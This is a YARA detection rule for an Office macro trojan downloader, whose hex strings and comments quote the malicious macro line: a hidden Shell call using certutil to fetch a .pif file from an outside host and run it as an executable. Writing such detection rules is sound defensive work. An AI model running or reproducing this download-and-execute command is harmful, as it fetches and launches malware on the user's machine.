
rule TrojanDownloader_O97M_Powdow_PDY_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDY!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 6b 65 65 70 77 65 61 6c 74 2e 63 6f 2e 7a 61 2f 72 65 70 61 72 61 74 69 6f 6e 73 2f 43 4f 4d 50 4c 45 54 45 2e 70 69 66 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://keepwealt.co.za/reparations/COMPLETE.pif"
		$a_01_1 = {42 67 69 6f 74 79 69 64 2e 65 78 65 2e 65 78 65 20 26 26 20 42 67 69 6f 74 79 69 64 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 Bgiotyid.exe.exe && Bgiotyid.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}